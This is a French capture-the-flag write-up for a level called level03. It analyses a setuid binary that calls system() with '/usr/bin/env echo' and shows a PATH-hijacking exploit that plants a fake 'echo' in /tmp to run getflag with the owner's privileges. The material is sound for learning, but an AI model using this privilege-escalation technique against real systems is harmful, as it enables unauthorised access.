# Level03

[ENGLISH version](README_EN.md)

## Comment récupérer le flag

J'ai au début pensé que level03 était un dossier.

Un coup de cat dessus, on peut voir qu'il s'agit d'un éxécutable.

De plus, il a des permissions étrange pour un éxécutable:

```
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
```

Le fichier a un bit Set-User-ID.

Il permet à un utilisateur d'exécuter le programme avec les droits du propriétaire, c'est ainsi que sudo nous permet d'exécuter des commandes en "root".

Il devrait donc nous permettre de l'executer avec les droits de flag03.

Voir cette video pour des expliations + claires: https://www.youtube.com/watch?v=2gHp_CgUets

Une fois lancé, il l'éxécutable affiche seulement 'Exploit me'.

Lancons cutter.

Dans la fonction main, on peut voir ce code:

```
void main(void)
{
    undefined4 uVar1;
    undefined4 uVar2;

    uVar1 = getegid();
    uVar2 = geteuid();
    setresgid(uVar1, uVar1, uVar1);
    setresuid(uVar2, uVar2, uVar2);
    system("/usr/bin/env echo Exploit me");
    return;
}
```

Selon le man:

```
getegid() returns the effective group ID of the calling process.

geteuid() returns the effective user ID of the calling process.

setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

setresgid() sets the real GID, effective GID, and saved set-group-ID of the calling process (and always modifies the file system GID to be the same as the effective GID)

system() executes a command specified in command by calling /bin/sh -c command, and returns after the command has been completed. During execution of the command, SIGCHLD will be blocked, and SIGINT and SIGQUIT will be ignored.
```

Pendant l'execution, on peut voir que l'uid et le gid valent 2003 (uid et gid de level03)

On peut changer l'uid et le gid de l'executable en utilisant gdb:

voir: https://scc.ustc.edu.cn/zlsc/sugon/intel/debugger/cl/commandref/gdb_mode/cmd_set_variable.htm

Après de nombreux essais infructueux de changer le texte de "/usr/bin/env echo Exploit me", j'ai abandonné cette methode.

En faisant un essai sur mon ordinateur hote, avec le meme code, je me suis apercu que, meme lancé avec les droits de flag03, /usr/bin/env garde les variables d'environnement de level03.

On peut donc faire une redirection de path.

De plus, /tmp est accessible en écriture.

On peut alors exploiter le path !

```
echo "/bin/getflag" > /tmp/echo

chmod +x /tmp/echo

export PATH=/tmp:$PATH

./level03
```

## Le flag

Le flag lu est celui utilisable pour se connecter a level04